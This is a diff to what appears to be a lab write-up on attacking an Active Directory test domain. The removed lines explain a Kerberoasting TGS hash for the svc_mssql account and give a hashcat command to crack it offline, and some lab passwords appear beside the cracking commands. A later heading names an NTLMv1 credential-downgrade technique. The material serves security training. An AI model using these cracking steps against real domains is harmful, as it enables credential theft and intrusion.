@@ -55,27 +55,6 @@ hashcat -m 13100 child_tgs.txt /home/vagrant/cadre_passwords.txt
 # analyst_t1 → T13r_An@lyst!
 ```
 
-The output file contains TGS hashes for every user with an SPN (2 in this lab). The key hash is `svc_mssql`:
-
-```
-$krb5tgs$23$*svc_mssql$CHILD.CADRE.LOCAL$child.cadre.local/svc_mssql*$<key>$<cipher>
-```
-
-This is a Kerberos TGS hash (hashcat mode 13100 — RC4-HMAC). The format breaks down as:
-
-- `$krb5tgs$23$` — hash type indicator (Kerberos 5 TGS, etype 23)
-- `*svc_mssql` — service account name
-- `$CHILD.CADRE.LOCAL` — domain
-- `$child.cadre.local/svc_mssql` — SPN format
-- `*$<key>$<cipher>` — encrypted ticket data (crackable offline)
-
-Crack with:
-
-```bash
-hashcat -m 13100 child_tgs.txt /home/vagrant/cadre_passwords.txt
-# svc_mssql → s3rv1c3_MSSQL!
-```
-
 ---
 
 #### NTLMv1 Rainbow Tables — Credential Downgrade (SpecterOps "Into The Rainbow") ⏳
